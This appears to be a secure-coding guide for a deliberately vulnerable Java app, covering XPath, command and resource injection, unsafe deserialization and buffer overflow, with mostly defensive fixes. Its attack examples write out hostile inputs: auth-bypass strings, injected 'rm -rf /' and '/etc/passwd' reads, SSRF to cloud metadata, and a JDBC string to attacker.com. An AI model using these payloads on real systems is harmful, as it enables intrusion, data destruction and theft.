# Security Vulnerabilities Documentation

This document describes the security vulnerabilities present in this application, their impact, and recommended fixes.

## Table of Contents

1. [XPath Injection](#1-xpath-injection)
2. [Buffer Overflow](#2-buffer-overflow)
3. [Serialization/Deserialization Exploit](#3-serializationdeserialization-exploit)
4. [Command Injection](#4-command-injection)
5. [Resource Injection](#5-resource-injection)

---

## 1. XPath Injection

### Location
`UserService.java` - `authenticate()` method

### Description
XPath injection occurs when user input is directly concatenated into XPath queries without proper sanitization or parameterization. This allows attackers to manipulate the query structure to bypass authentication or extract sensitive data.

### Vulnerable Code
```java
public boolean authenticate(String username, String password) {
    // VULNERABLE: Direct string concatenation
    String expression = "//user[username='" + username + 
                      "' and password='" + password + "']";
    XPathExpression expr = xpath.compile(expression);
    // ...
}
```

### How the Attack Works
An attacker can inject XPath expressions by providing malicious input:

**Example Attack:**
```java
// Normal input
username = "admin"
password = "secret123"

// Malicious input
username = "admin' or '1'='1"
password = "anything"

// Resulting XPath query:
// //user[username='admin' or '1'='1' and password='anything']
// This evaluates to true for all users!
```

**Other Attack Examples:**
- `username = "' or '1'='1"` - Bypasses authentication
- `username = "admin' or '1'='1" or 'a'='a"` - Multiple injection points
- `password = "' or '1'='1"` - Extracts all user data

### Impact
- **Authentication Bypass**: Attackers can log in without valid credentials
- **Data Extraction**: Attackers can extract all user data from XML
- **Privilege Escalation**: Attackers can access administrator accounts
- **Information Disclosure**: Sensitive user information can be leaked

### Fix/Prevention

#### Option 1: Use Parameterized XPath (Recommended)
```java
public boolean authenticate(String username, String password) {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new InputSource(new StringReader(XML_DATA)));
        
        XPathFactory xPathFactory = XPathFactory.newInstance();
        XPath xpath = xPathFactory.newXPath();
        
        // FIXED: Use parameterized XPath with variables
        XPathVariableResolver resolver = new XPathVariableResolver() {
            @Override
            public Object resolveVariable(QName variableName) {
                if (variableName.getLocalPart().equals("username")) {
                    return username;
                } else if (variableName.getLocalPart().equals("password")) {
                    return password;
                }
                return null;
            }
        };
        xpath.setXPathVariableResolver(resolver);
        
        String expression = "//user[username=$username and password=$password]";
        XPathExpression expr = xpath.compile(expression);
        Object result = expr.evaluate(doc);
        
        return result != null && result.toString().length() > 0;
    } catch (Exception e) {
        System.err.println("Authentication error: " + e.getMessage());
        return false;
    }
}
```

#### Option 2: Input Validation and Sanitization
```java
public boolean authenticate(String username, String password) {
    // FIXED: Validate and sanitize input
    if (!isValidInput(username) || !isValidInput(password)) {
        return false;
    }
    
    // Escape special characters
    username = escapeXPathString(username);
    password = escapeXPathString(password);
    
    String expression = "//user[username='" + username + 
                      "' and password='" + password + "']";
    // ...
}

private boolean isValidInput(String input) {
    // Whitelist validation: only allow alphanumeric and common characters
    return input != null && input.matches("^[a-zA-Z0-9@._-]+$") 
           && input.length() <= 50;
}

private String escapeXPathString(String input) {
    if (input == null) return "";
    // Escape single quotes by doubling them
    return input.replace("'", "''");
}
```

#### Option 3: Use Prepared XPath with DOM Navigation
```java
public boolean authenticate(String username, String password) {
    try {
        Document doc = parseXML();
        NodeList users = doc.getElementsByTagName("user");
        
        // FIXED: Manual DOM navigation instead of XPath with user input
        for (int i = 0; i < users.getLength(); i++) {
            Node user = users.item(i);
            String xmlUsername = getNodeValue(user, "username");
            String xmlPassword = getNodeValue(user, "password");
            
            // Safe comparison without XPath injection
            if (username.equals(xmlUsername) && password.equals(xmlPassword)) {
                return true;
            }
        }
        return false;
    } catch (Exception e) {
        return false;
    }
}
```

### Best Practices
- Always use parameterized XPath queries
- Validate and sanitize all user input
- Use whitelist validation (allow only expected characters)
- Escape special characters properly
- Consider using DOM navigation instead of XPath for user queries
- Implement rate limiting on authentication attempts
- Log failed authentication attempts for monitoring

---

## 2. Buffer Overflow

### Location
`DataProcessor.java` - `processData()` and `writeToBuffer()` methods

### Description
Buffer overflow occurs when data is written beyond the allocated buffer boundaries without proper bounds checking. While Java has some built-in protections, buffer overflows can still occur with native code, JNI, or improper use of ByteBuffer and array operations.

### Vulnerable Code
```java
public void processData(byte[] input) {
    // VULNERABLE: No bounds checking
    System.arraycopy(input, 0, buffer, 0, input.length);
}

public void writeToBuffer(byte[] data) {
    ByteBuffer buffer = ByteBuffer.allocate(BUFFER_SIZE);
    // VULNERABLE: No check if data exceeds buffer capacity
    buffer.put(data);
}
```

### How the Attack Works
An attacker can provide data larger than the buffer size:

**Example Attack:**
```java
// Normal input
byte[] normalData = {1, 2, 3, 4, 5}; // size = 5

// Malicious input
byte[] overflowData = new byte[1000]; // size = 1000
Arrays.fill(overflowData, (byte) 0xFF);

// Result: Buffer overflow, potential data corruption or crash
processor.processData(overflowData);
```

### Impact
- **Data Corruption**: Overwritten memory can corrupt adjacent data structures
- **Application Crash**: Can cause `ArrayIndexOutOfBoundsException` or `BufferOverflowException`
- **Security Bypass**: In native code, can lead to code execution
- **Denial of Service**: Application may become unresponsive or crash

### Fix/Prevention

#### Option 1: Bounds Checking (Recommended)
```java
public void processData(byte[] input) {
    // FIXED: Validate input size before copying
    if (input == null) {
        throw new IllegalArgumentException("Input cannot be null");
    }
    
    if (input.length > buffer.length) {
        throw new IllegalArgumentException(
            "Input size (" + input.length + ") exceeds buffer size (" + buffer.length + ")");
    }
    
    System.arraycopy(input, 0, buffer, 0, input.length);
}

public void writeToBuffer(byte[] data) {
    // FIXED: Check capacity before writing
    if (data == null) {
        throw new IllegalArgumentException("Data cannot be null");
    }
    
    if (data.length > BUFFER_SIZE) {
        throw new IllegalArgumentException("Data exceeds buffer capacity");
    }
    
    ByteBuffer buffer = ByteBuffer.allocate(BUFFER_SIZE);
    buffer.put(data);
}
```

#### Option 2: Use Dynamic Sizing
```java
public void processData(byte[] input) {
    // FIXED: Resize buffer if needed (or truncate input)
    if (input == null) {
        throw new IllegalArgumentException("Input cannot be null");
    }
    
    int copyLength = Math.min(input.length, buffer.length);
    System.arraycopy(input, 0, buffer, 0, copyLength);
    
    if (input.length > buffer.length) {
        // Log warning or handle truncation
        System.err.println("Warning: Input truncated from " + input.length + 
                          " to " + buffer.length + " bytes");
    }
}
```

#### Option 3: Use Java Collections
```java
// FIXED: Use ArrayList instead of fixed-size array
private List<Byte> buffer = new ArrayList<>(BUFFER_SIZE);

public void processData(byte[] input) {
    buffer.clear();
    for (byte b : input) {
        if (buffer.size() < BUFFER_SIZE) {
            buffer.add(b);
        } else {
            throw new IllegalArgumentException("Buffer full");
        }
    }
}
```

### Best Practices
- Always validate input size before copying to buffers
- Use bounds checking for all array operations
- Prefer Java collections (ArrayList, etc.) over raw arrays when possible
- Be extra careful with JNI and native code
- Use defensive programming: assume input is malicious
- Implement proper error handling for buffer overflow scenarios
- Consider using `Arrays.copyOf()` for safe copying

---

## 3. Serialization/Deserialization Exploit

### Location
`CacheManager.java` - `loadFromCache()` and `CacheEntry.readObject()` methods

### Description
Deserializing untrusted data can lead to Remote Code Execution (RCE), Denial of Service (DoS), or information disclosure. The `readObject()` method is automatically called during deserialization and can execute arbitrary code.

### Vulnerable Code
```java
public Object loadFromCache(String filename) throws Exception {
    // VULNERABLE: Deserializes data without validation
    try (ObjectInputStream ois = new ObjectInputStream(
            new FileInputStream(filename))) {
        return ois.readObject(); // Dangerous!
    }
}

// In CacheEntry class
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    // VULNERABLE: Code execution during deserialization
    System.out.println("Cache entry loaded: " + data);
    // Could execute: Runtime.getRuntime().exec(command);
}
```

### How the Attack Works
An attacker can create a malicious serialized object that executes code when deserialized:

**Example Attack:**
```java
// Attacker creates malicious object
MaliciousObject malicious = new MaliciousObject("rm -rf /");
cache.saveToCache(malicious, "cache.ser");

// Victim loads the cache
Object loaded = cache.loadFromCache("cache.ser");
// readObject() is automatically called, executing malicious code!
```

**Gadget Chain Attack:**
Attackers can chain multiple vulnerable classes together to create more sophisticated exploits.

### Impact
- **Remote Code Execution (RCE)**: Attackers can execute arbitrary commands
- **Denial of Service**: Malicious objects can consume excessive resources
- **Information Disclosure**: Sensitive data can be extracted
- **System Compromise**: Full system access in worst-case scenarios

### Fix/Prevention

#### Option 1: Use ObjectInputFilter (Java 9+, Recommended)
```java
public Object loadFromCache(String filename) throws Exception {
    try (ObjectInputStream ois = new ObjectInputStream(
            new FileInputStream(filename))) {
        
        // FIXED: Use ObjectInputFilter to whitelist allowed classes
        ois.setObjectInputFilter(new ObjectInputFilter() {
            @Override
            public Status checkInput(FilterInfo filterInfo) {
                Class<?> clazz = filterInfo.serialClass();
                if (clazz != null) {
                    // Only allow CacheEntry class
                    if (clazz == CacheEntry.class) {
                        return Status.ALLOWED;
                    }
                    // Reject all other classes
                    return Status.REJECTED;
                }
                return Status.UNDECIDED;
            }
        });
        
        return ois.readObject();
    }
}
```

#### Option 2: Avoid Java Serialization (Best Practice)
```java
// FIXED: Use JSON instead of Java serialization
import com.fasterxml.jackson.databind.ObjectMapper;

public void saveToCache(CacheEntry entry, String filename) throws Exception {
    ObjectMapper mapper = new ObjectMapper();
    mapper.writeValue(new File(filename), entry);
}

public CacheEntry loadFromCache(String filename) throws Exception {
    ObjectMapper mapper = new ObjectMapper();
    return mapper.readValue(new File(filename), CacheEntry.class);
}
```

#### Option 3: Custom Validation in readObject()
```java
public static class CacheEntry implements Serializable {
    private static final long serialVersionUID = 1L;
    private String data;
    private long timestamp;
    
    // FIXED: Validate data during deserialization
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        
        // Validate deserialized data
        if (data == null || data.length() > MAX_DATA_LENGTH) {
            throw new InvalidObjectException("Invalid cache entry data");
        }
        
        if (timestamp < 0 || timestamp > System.currentTimeMillis() + 86400000) {
            throw new InvalidObjectException("Invalid timestamp");
        }
        
        // DO NOT execute any system commands or external operations
        // Only perform validation and data integrity checks
    }
}
```

#### Option 4: Use Externalizable with Validation
```java
public static class CacheEntry implements Externalizable {
    private String data;
    private long timestamp;
    
    // FIXED: Explicit control over serialization
    @Override
    public void writeExternal(ObjectOutput out) throws IOException {
        out.writeUTF(data);
        out.writeLong(timestamp);
    }
    
    @Override
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
        data = in.readUTF();
        timestamp = in.readLong();
        
        // Validate after reading
        if (data == null || data.length() > MAX_DATA_LENGTH) {
            throw new InvalidObjectException("Invalid data");
        }
    }
}
```

### Best Practices
- **Avoid Java serialization** for untrusted data - use JSON, XML, or Protocol Buffers instead
- Use `ObjectInputFilter` (Java 9+) to whitelist allowed classes
- Never execute system commands in `readObject()` methods
- Validate all deserialized data
- Use `Externalizable` for explicit control over serialization
- Implement integrity checks (checksums, signatures)
- Consider using sealed classes (Java 17+) to prevent subclassing
- Log all deserialization attempts for monitoring

---

## 4. Command Injection

### Location
`NetworkUtils.java` - `pingHost()` and `readFile()` methods

### Description
Command injection occurs when user input is directly concatenated into system commands without sanitization. This allows attackers to execute arbitrary commands on the host system.

### Vulnerable Code
```java
public String pingHost(String host) {
    // VULNERABLE: User input directly in command string
    String command = "ping -c 1 " + host;
    Process process = Runtime.getRuntime().exec(command);
    // ...
}

public String readFile(String filename) {
    // VULNERABLE: User input in ProcessBuilder without validation
    ProcessBuilder pb = new ProcessBuilder("cat", filename);
    Process process = pb.start();
    // ...
}
```

### How the Attack Works
An attacker can inject command separators to execute additional commands:

**Example Attacks:**
```java
// Attack 1: Command chaining with semicolon
host = "localhost; rm -rf /"
// Executes: ping -c 1 localhost; rm -rf /

// Attack 2: Command chaining with &&
host = "localhost && cat /etc/passwd"
// Executes: ping -c 1 localhost && cat /etc/passwd

// Attack 3: Pipe command
host = "localhost | whoami"
// Executes: ping -c 1 localhost | whoami

// Attack 4: Backtick execution
host = "localhost `cat /etc/passwd`"
// Executes: ping -c 1 localhost `cat /etc/passwd`

// Attack 5: ProcessBuilder injection
filename = "../../../etc/passwd"
// Accesses unauthorized files
```

### Impact
- **Remote Code Execution**: Attackers can execute arbitrary system commands
- **Data Theft**: Access to sensitive files and data
- **System Compromise**: Full control over the host system
- **Data Destruction**: Delete files or entire systems
- **Privilege Escalation**: Gain elevated privileges

### Fix/Prevention

#### Option 1: Use ProcessBuilder with Array (Recommended)
```java
public String pingHost(String host) {
    // FIXED: Use ProcessBuilder with array, no shell interpretation
    try {
        // Validate input first
        if (!isValidHostname(host)) {
            throw new IllegalArgumentException("Invalid hostname");
        }
        
        // Use array to prevent command injection
        ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
        pb.redirectErrorStream(true);
        Process process = pb.start();
        
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
        
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        
        process.waitFor();
        return output.toString();
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}

private boolean isValidHostname(String host) {
    // Whitelist validation: only allow valid hostname characters
    if (host == null || host.length() > 255) {
        return false;
    }
    // Allow only alphanumeric, dots, hyphens
    return host.matches("^[a-zA-Z0-9.-]+$");
}
```

#### Option 2: Input Validation and Sanitization
```java
public String pingHost(String host) {
    // FIXED: Sanitize input to remove dangerous characters
    host = sanitizeInput(host);
    
    if (host == null || host.isEmpty()) {
        throw new IllegalArgumentException("Host cannot be empty");
    }
    
    String command = "ping -c 1 " + host;
    // Still vulnerable if shell is used, prefer ProcessBuilder
    Process process = Runtime.getRuntime().exec(command);
    // ...
}

private String sanitizeInput(String input) {
    if (input == null) return "";
    // Remove all command injection characters
    return input.replaceAll("[;&|`$(){}]", "");
}
```

#### Option 3: Use Whitelist Validation
```java
public String readFile(String filename) {
    // FIXED: Whitelist validation for file paths
    if (!isAllowedFile(filename)) {
        throw new SecurityException("Access denied to file: " + filename);
    }
    
    // Use ProcessBuilder with array
    ProcessBuilder pb = new ProcessBuilder("cat", filename);
    Process process = pb.start();
    // ...
}

private boolean isAllowedFile(String filename) {
    // Define allowed directory
    String allowedDir = "/var/app/data/";
    Path filePath = Paths.get(filename).normalize();
    Path allowedPath = Paths.get(allowedDir).normalize();
    
    // Ensure file is within allowed directory
    return filePath.startsWith(allowedPath) && 
           !filename.contains(".."); // Prevent path traversal
}
```

#### Option 4: Avoid System Commands Entirely
```java
// FIXED: Use Java APIs instead of system commands
public String readFile(String filename) {
    try {
        // Use Java NIO instead of 'cat' command
        Path filePath = Paths.get(filename);
        
        // Validate path
        if (!isAllowedFile(filename)) {
            throw new SecurityException("Access denied");
        }
        
        return new String(Files.readAllBytes(filePath));
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}

public boolean pingHost(String host) {
    try {
        // Use Java networking instead of ping command
        InetAddress address = InetAddress.getByName(host);
        return address.isReachable(5000); // 5 second timeout
    } catch (Exception e) {
        return false;
    }
}
```

### Best Practices
- **Never use user input directly in command strings**
- Use `ProcessBuilder` with array arguments (prevents shell interpretation)
- Validate and sanitize all user input using whitelist validation
- Avoid system commands when Java APIs are available
- Implement least privilege: run with minimal permissions
- Use parameterized commands (array format)
- Log all command executions for auditing
- Implement rate limiting to prevent abuse
- Consider using libraries like Apache Commons Exec for better control

---

## 5. Resource Injection

### Location
`FileManager.java` - `readFile()`, `fetchUrl()`, `connectDatabase()`, and `connectSocket()` methods

### Description
Resource injection occurs when user input is used to access system resources (files, network connections, databases) without validation. This allows attackers to access unauthorized resources or perform Server-Side Request Forgery (SSRF) attacks.

### Vulnerable Code
```java
public String readFile(String filename) {
    // VULNERABLE: Direct file access without path validation
    Path filePath = Paths.get(filename);
    return new String(Files.readAllBytes(filePath));
}

public String fetchUrl(String urlString) {
    // VULNERABLE: User input directly in URL
    URL url = new URL(urlString);
    URLConnection connection = url.openConnection();
    // ...
}

public Connection connectDatabase(String connectionString) {
    // VULNERABLE: User input in connection string
    return DriverManager.getConnection(connectionString);
}
```

### How the Attack Works

**Path Traversal Attack:**
```java
// Attack: Access unauthorized files
filename = "../../../etc/passwd"
// Accesses: /etc/passwd instead of intended file
```

**SSRF Attack:**
```java
// Attack: Access internal services
urlString = "http://localhost:8080/admin"
urlString = "file:///etc/passwd"
urlString = "http://169.254.169.254/latest/meta-data/" // AWS metadata
```

**Database Connection Hijacking:**
```java
// Attack: Connect to attacker's database
connectionString = "jdbc:mysql://attacker.com/malicious?user=admin&password=pass"
```

**Socket Connection to Unauthorized Hosts:**
```java
// Attack: Network reconnaissance
host = "internal-server.local"
port = 22 // SSH port
```

### Impact
- **Unauthorized File Access**: Read sensitive system files
- **Server-Side Request Forgery (SSRF)**: Access internal services
- **Information Disclosure**: Extract sensitive data
- **Network Reconnaissance**: Map internal network
- **Database Compromise**: Connect to malicious databases
- **Data Exfiltration**: Steal sensitive information

### Fix/Prevention

#### Option 1: Path Validation and Whitelisting
```java
public String readFile(String filename) {
    // FIXED: Validate and normalize path
    try {
        // Define allowed base directory
        Path baseDir = Paths.get("/var/app/data").toAbsolutePath().normalize();
        Path filePath = Paths.get(filename).toAbsolutePath().normalize();
        
        // Ensure file is within allowed directory
        if (!filePath.startsWith(baseDir)) {
            throw new SecurityException("Access denied: File outside allowed directory");
        }
        
        // Additional validation: check for path traversal attempts
        if (filename.contains("..") || filename.contains("~")) {
            throw new SecurityException("Invalid file path");
        }
        
        // Check if file exists and is readable
        if (!Files.exists(filePath) || !Files.isReadable(filePath)) {
            throw new SecurityException("File not accessible");
        }
        
        return new String(Files.readAllBytes(filePath));
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}
```

#### Option 2: URL Whitelisting
```java
public String fetchUrl(String urlString) {
    // FIXED: Validate and whitelist URLs
    try {
        URL url = new URL(urlString);
        
        // Only allow HTTP/HTTPS
        String protocol = url.getProtocol();
        if (!protocol.equals("http") && !protocol.equals("https")) {
            throw new SecurityException("Only HTTP/HTTPS URLs allowed");
        }
        
        // Whitelist allowed hosts
        String host = url.getHost();
        List<String> allowedHosts = Arrays.asList("example.com", "api.example.com");
        if (!allowedHosts.contains(host)) {
            throw new SecurityException("Host not in whitelist: " + host);
        }
        
        // Prevent access to internal IPs
        InetAddress address = InetAddress.getByName(host);
        if (address.isLoopbackAddress() || address.isLinkLocalAddress() || 
            address.isSiteLocalAddress()) {
            throw new SecurityException("Access to internal addresses denied");
        }
        
        // Prevent access to private IP ranges
        if (isPrivateIP(address)) {
            throw new SecurityException("Access to private IP ranges denied");
        }
        
        URLConnection connection = url.openConnection();
        // Set timeout
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);
        
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(connection.getInputStream()));
        
        StringBuilder content = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            content.append(line).append("\n");
        }
        
        return content.toString();
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}

private boolean isPrivateIP(InetAddress address) {
    byte[] bytes = address.getAddress();
    // Check for private IP ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
    return (bytes[0] == 10) ||
           (bytes[0] == (byte)172 && bytes[1] >= 16 && bytes[1] <= 31) ||
           (bytes[0] == (byte)192 && bytes[1] == (byte)168);
}
```

#### Option 3: Database Connection Validation
```java
public Connection connectDatabase(String connectionString) {
    // FIXED: Use predefined connection strings, not user input
    // Better approach: Use configuration file or environment variables
    try {
        // Parse and validate connection string
        if (!isValidConnectionString(connectionString)) {
            throw new SecurityException("Invalid database connection string");
        }
        
        // Extract components and validate
        URI dbUri = new URI(connectionString.replaceFirst("jdbc:", ""));
        String host = dbUri.getHost();
        
        // Whitelist allowed database hosts
        List<String> allowedHosts = Arrays.asList("db.example.com", "db2.example.com");
        if (!allowedHosts.contains(host)) {
            throw new SecurityException("Database host not allowed: " + host);
        }
        
        return DriverManager.getConnection(connectionString);
    } catch (Exception e) {
        System.err.println("Database connection error: " + e.getMessage());
        return null;
    }
}

// Even better: Don't accept connection strings from users at all
public Connection connectDatabase() {
    // FIXED: Use configuration, not user input
    String dbUrl = System.getenv("DB_URL");
    String dbUser = System.getenv("DB_USER");
    String dbPassword = System.getenv("DB_PASSWORD");
    
    Properties props = new Properties();
    props.setProperty("user", dbUser);
    props.setProperty("password", dbPassword);
    
    return DriverManager.getConnection(dbUrl, props);
}
```

#### Option 4: Socket Connection Whitelisting
```java
public void connectSocket(String host, int port) {
    // FIXED: Whitelist allowed hosts and ports
    try {
        // Validate host
        if (!isAllowedHost(host)) {
            throw new SecurityException("Host not allowed: " + host);
        }
        
        // Validate port range
        if (port < 1 || port > 65535) {
            throw new SecurityException("Invalid port: " + port);
        }
        
        // Whitelist allowed ports
        List<Integer> allowedPorts = Arrays.asList(80, 443, 8080);
        if (!allowedPorts.contains(port)) {
            throw new SecurityException("Port not allowed: " + port);
        }
        
        // Prevent access to internal addresses
        InetAddress address = InetAddress.getByName(host);
        if (isPrivateIP(address) || address.isLoopbackAddress()) {
            throw new SecurityException("Access to internal addresses denied");
        }
        
        Socket socket = new Socket(host, port);
        socket.setSoTimeout(5000); // 5 second timeout
        System.out.println("Connected to " + host + ":" + port);
        socket.close();
    } catch (Exception e) {
        System.err.println("Socket connection error: " + e.getMessage());
    }
}

private boolean isAllowedHost(String host) {
    List<String> allowedHosts = Arrays.asList("api.example.com", "service.example.com");
    return allowedHosts.contains(host);
}
```

### Best Practices
- **Never trust user input** for resource identifiers
- Use whitelist validation for all resources (files, URLs, hosts, ports)
- Normalize and validate file paths to prevent path traversal
- Restrict network access to allowed hosts and ports only
- Prevent access to internal/private IP addresses
- Use configuration files or environment variables for connection strings
- Implement proper access controls and authentication
- Set timeouts on all network operations
- Log all resource access attempts for auditing
- Use least privilege principle: grant minimum required access
- Consider using a proxy or gateway for external resource access
- Implement rate limiting to prevent abuse

---

## General Security Best Practices

1. **Input Validation**: Always validate and sanitize all user input
2. **Principle of Least Privilege**: Run applications with minimum required permissions
3. **Defense in Depth**: Implement multiple layers of security
4. **Secure by Default**: Design systems to be secure by default
5. **Fail Securely**: Handle errors without exposing sensitive information
6. **Security Testing**: Regularly perform security audits and penetration testing
7. **Stay Updated**: Keep dependencies and frameworks updated
8. **Code Reviews**: Conduct security-focused code reviews
9. **Security Training**: Educate developers on secure coding practices
10. **Logging and Monitoring**: Log security events and monitor for anomalies

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)
- [Java Secure Coding Guidelines](https://www.oracle.com/java/technologies/javase/seccodeguide.html)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

